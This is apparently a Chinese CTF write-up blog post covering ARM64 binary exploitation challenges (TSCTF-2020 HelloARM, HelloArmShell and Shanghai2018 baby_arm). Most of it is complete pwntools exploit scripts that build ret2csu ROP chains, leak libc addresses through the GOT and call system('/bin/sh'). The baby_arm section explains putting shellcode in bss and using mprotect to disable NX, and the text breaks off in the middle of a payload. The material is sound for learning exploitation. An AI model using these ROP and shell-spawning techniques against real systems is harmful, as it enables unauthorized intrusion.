operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64-static"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/TSCTF-arm/HelloARM"</span><span class="token punctuation">,</span> <span class="token string">"./HelloARM"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64-static"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/TSCTF-arm/HelloARM"</span><span class="token punctuation">,</span> <span class="token string">"./HelloARM"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ppop_x20_x21_x22_x23_x24_x29_x30 <span class="token operator">=</span> <span class="token number">0x000000000400AD4</span> <span class="token comment" spellcheck="true"># 00AD4 LDP             X20, X21, [SP,#0x18+var_s0]</span><span class="token comment" spellcheck="true"># .text:0000000000400AD8 LDP             X22, X23, [SP,#0x18+var_s10]</span><span class="token comment" spellcheck="true"># .text:0000000000400ADC LDR             X24, [SP,#0x18+var_s20]</span><span class="token comment" spellcheck="true"># .text:0000000000400AE0 LDP             X29, X30, [SP+0x18+var_18]</span>mov_x3_num_x2_x24_x1_x23_w0_w22 <span class="token operator">=</span> <span class="token number">0x400a80</span><span class="token comment" spellcheck="true">#.text:0000000000400AB0 LDR             X3, [X21,X19,LSL#3] = x21 + x19&lt;&lt;3</span><span class="token comment" spellcheck="true">#.text:0000000000400AB4 MOV             X2, X24</span><span class="token comment" spellcheck="true">#.text:0000000000400AB8 MOV             X1, X23</span><span class="token comment" spellcheck="true">#.text:0000000000400ABC MOV             W0, W22</span><span class="token comment" spellcheck="true">#.text:0000000000400AC0 ADD             X19, X19, #1</span><span class="token comment" spellcheck="true">#.text:0000000000400AC4 BLR             X3</span><span class="token comment" spellcheck="true">#.text:0000000000400AC8 CMP             X20, X19</span><span class="token comment" spellcheck="true">#.text:0000000000400ACC B.NE            loc_400</span>ldr_x19_ldr_x29_x30 <span class="token operator">=</span> <span class="token number">0x400884</span><span class="token comment" spellcheck="true">#.text:0000000000400884 LDR             X19, [SP,#0x20+var_10]</span><span class="token comment" spellcheck="true">#.text:0000000000400888 LDP             X29, X30, [SP+0x20+var_20],#0x20</span><span class="token comment" spellcheck="true">#.text:000000000040088C RET]]</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span>var2<span class="token punctuation">,</span>var3<span class="token punctuation">,</span>ebp<span class="token punctuation">,</span>call_func<span class="token punctuation">,</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400884</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">288</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400ad4</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token comment" spellcheck="true"># d80</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400a68</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># d90</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_func<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var1<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var2<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var3<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400790</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadp <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":0x"</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>new_ebp <span class="token operator">=</span> stack_addr<span class="token number">-0x28</span>payload <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x411100</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>new_ebp<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x400ab0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">,</span>pyload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":0x"</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>new_ebp <span class="token operator">=</span> stack_addr<span class="token number">-0x28</span>payload <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x411100</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>new_ebp<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x400ab0</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-TSCTF-2020-HelloArmShell"><a href="#0x02-TSCTF-2020-HelloArmShell" class="headerlink" title="0x02 TSCTF-2020 HelloArmShell"></a>0x02 TSCTF-2020 HelloArmShell</h1><p>题目是一样的，看起来是要拿shell的意思，思路就是CSU进行leak libc再执行system(“/bin/sh”)</p><p>执行system(“/bin/sh”)有两个思路，第一个是劫持got表，第二个是rop，rop会比较麻烦？</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./HelloARM"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">global</span> premote_gdb<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64-static"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/TSCTF-arm/HelloARM"</span><span class="token punctuation">,</span> <span class="token string">"./HelloARM"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64-static"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/TSCTF-arm/HelloARM"</span><span class="token punctuation">,</span> <span class="token string">"./HelloARM"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ppop_x20_x21_x22_x23_x24_x29_x30 <span class="token operator">=</span> <span class="token number">0x000000000400AD4</span> <span class="token comment" spellcheck="true"># 00AD4 LDP             X20, X21, [SP,#0x18+var_s0]</span><span class="token comment" spellcheck="true"># .text:0000000000400AD8 LDP             X22, X23, [SP,#0x18+var_s10]</span><span class="token comment" spellcheck="true"># .text:0000000000400ADC LDR             X24, [SP,#0x18+var_s20]</span><span class="token comment" spellcheck="true"># .text:0000000000400AE0 LDP             X29, X30, [SP+0x18+var_18]</span>mov_x3_num_x2_x24_x1_x23_w0_w22 <span class="token operator">=</span> <span class="token number">0x400a80</span><span class="token comment" spellcheck="true">#.text:0000000000400AB0 LDR             X3, [X21,X19,LSL#3] = x21 + x19&lt;&lt;3</span><span class="token comment" spellcheck="true">#.text:0000000000400AB4 MOV             X2, X24</span><span class="token comment" spellcheck="true">#.text:0000000000400AB8 MOV             X1, X23</span><span class="token comment" spellcheck="true">#.text:0000000000400ABC MOV             W0, W22</span><span class="token comment" spellcheck="true">#.text:0000000000400AC0 ADD             X19, X19, #1</span><span class="token comment" spellcheck="true">#.text:0000000000400AC4 BLR             X3</span><span class="token comment" spellcheck="true">#.text:0000000000400AC8 CMP             X20, X19</span><span class="token comment" spellcheck="true">#.text:0000000000400ACC B.NE            loc_400</span>ldr_x19_ldr_x29_x30 <span class="token operator">=</span> <span class="token number">0x400884</span><span class="token comment" spellcheck="true">#.text:0000000000400884 LDR             X19, [SP,#0x20+var_10]</span><span class="token comment" spellcheck="true">#.text:0000000000400888 LDP             X29, X30, [SP+0x20+var_20],#0x20</span><span class="token comment" spellcheck="true">#.text:000000000040088C RET]]</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span>var2<span class="token punctuation">,</span>var3<span class="token punctuation">,</span>ebp<span class="token punctuation">,</span>call_func<span class="token punctuation">,</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400884</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">288</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400ad4</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token comment" spellcheck="true"># d80</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400a68</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># d90</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_func<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var1<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var2<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>var3<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>ebp<span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400790</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadp <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":0x"</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>new_ebp <span class="token operator">=</span> stack_addr<span class="token number">-0x28</span>payload <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>new_ebp<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x400ab0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":0x"</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>new_ebp <span class="token operator">=</span> stack_addr<span class="token number">-0x28</span>payload <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x411100</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>new_ebp<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x400ab0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">0x411100</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>new_ebp<span class="token punctuation">,</span><span class="token number">0x411108</span><span class="token punctuation">,</span><span class="token number">0x400ab0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"shinnosuke"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"message:"</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-Shanghai2018-baby-arm"><a href="#0x03-Shanghai2018-baby-arm" class="headerlink" title="0x03 Shanghai2018_baby_arm"></a>0x03 Shanghai2018_baby_arm</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>从图中可以看出这是一个64位arm架构的题目：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/3.png"></div><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>IDA分析的时候又遇到一个坑点：7.2的无法反汇编，最后用7.0的成功解决。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/4.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/5.png"></div><p>功能大致是：先读一段到bss段，再来一个栈溢出。<br>同时我们看到这里有个mprotect函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/6.png"></div><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>那么我们大致思路就是先写入bss段shellcode，再利用栈溢出执行mprotect函数将NX保护关闭。</p><p>我们需要找汇编指令链了：<br>LDP             X29, X30, [SP+var_s0],#0x10意义：x29 = [sp+var_s0],x30 = [sp+var_s0+8],注意X30就是下一条执行的指令</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/7.png"></div><p>（ldp              x29, x30, [sp],  #0x40  ）  的意义:执行完后sp+0x40，#0x40 是本身带有的</p><p>还有LDR指令：<br>指令示例：<br>LDR   R0，[R1]                  ；将存储器地址为R1的字数据读入寄存器R0。<br>LDR   R0，[R1，R2]             ；将存储器地址为R1+R2的字数据读入寄存器R0。<br>LDR   R0，[R1，＃8]             ；将存储器地址为R1+8的字数据读入寄存器R0。<br>LDR   R0，[R1，R2] ！           ；将存储器地址为R1+R2的字数据读入寄存器R0，并将新地址R1＋R2写入R1。<br>LDR   R0，[R1，＃8] ！          ；将存储器地址为R1+8的字数据读入寄存器R0，并将新地址R1＋8写入R1。<br>LDR   R0，[R1]，R2              ；将存储器地址为R1的字数据读入寄存器R0，并将新地址R1＋R2写入R1。<br>LDR   R0，[R1，R2，LSL＃2]！   ；将存储器地址为R1＋R2×4的字数据读入寄存器R0，并将新地址R1＋R2×4写入R1。（会用到）<br>LDR   R0，[R1]，R2，LSL＃2     ；将存储器地址为R1的字数据读入寄存器R0，并将新地址R1＋R2×4写入R1。</p><p>blr r3  跳到r3寄存器中的地址执行</p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4008CC</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify x30(PC) = 0x4008CC = give value to register</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X29 (sp+0)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4008AC</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X30  这个将会在最后赋值给X30，也就是ret后执行的指令地址</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token 